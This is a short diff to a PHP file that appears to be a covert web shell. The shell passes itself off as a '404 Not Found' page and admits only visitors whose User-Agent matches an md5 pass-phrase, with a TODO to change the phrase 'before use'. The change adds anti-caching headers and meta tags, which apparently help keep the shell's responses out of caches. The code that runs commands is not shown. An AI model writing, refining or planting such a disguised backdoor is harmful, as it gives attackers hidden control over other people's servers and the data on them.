@@ -7,6 +7,11 @@ set_time_limit(0);
 
 $shell = $_SERVER["PHP_SELF"];
 
+header("Expires: Sun, 01 Jan 2000 00:00:00 GMT");
+header("Cache-Control: no-store, no-cache, must-revalidate");
+header("Cache-Control: post-check=0, pre-check=0", FALSE);
+header("Pragma: no-cache");
+
 if ($use_auth)
 {
 	if ($_SERVER["HTTP_USER_AGENT"] != md5("LET_ME_IN")) // TODO: change pass-phrase before use
@@ -73,6 +78,8 @@ echo( sprintf("
 	<title>404 Not Found</title>
 
 	<meta charset='utf-8' /> 
+	<meta http-equiv='expires' content='Sun, 01 Jan 2000 00:00:00 GMT' />
+	<meta http-equiv='pragma' content='no-cache' />
 
 	<style>
 	body {
